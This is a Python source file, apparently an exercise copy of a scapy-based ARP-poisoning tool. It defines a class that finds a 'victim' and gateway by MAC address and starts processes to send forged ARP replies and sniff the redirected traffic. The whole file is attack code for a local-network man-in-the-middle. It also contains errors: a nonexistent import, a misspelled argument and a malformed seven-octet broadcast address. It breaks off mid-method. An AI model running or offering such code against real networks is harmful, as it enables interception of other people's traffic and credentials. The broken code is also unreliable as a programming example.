#ARP is a table of MAC addresses 
from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrev, srp, wrpcap)

import os
import sys
import time

def get_mac(targetip):
    #destination mac address (default gateway) / running ARP func passing op and pdst
    packet = Ether(dst= 'ff:ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    #retry 10 times and don't verbse output
    #srp sends packets and receives answers on Layer 2
    resp, _ = srp(packet, timeout=2, retry=10, verbse=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper():
    def __init__(self, victim, gateway, interface='eth0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface 
        conf.iface = interface 
        conf.verb = 0
        
        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
    
    def run(self):
        self.poison_thread = Process(target = self.poison)
        self.poison_thread.start()
        
        self.sniff_thread = Process(target = self.sniff)
        self.sniff_thread.start()
        
    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim 
        poison_victim.hwdst = self.victimmac 
        print(f'ip src: {poison_victim.psrc}')
        print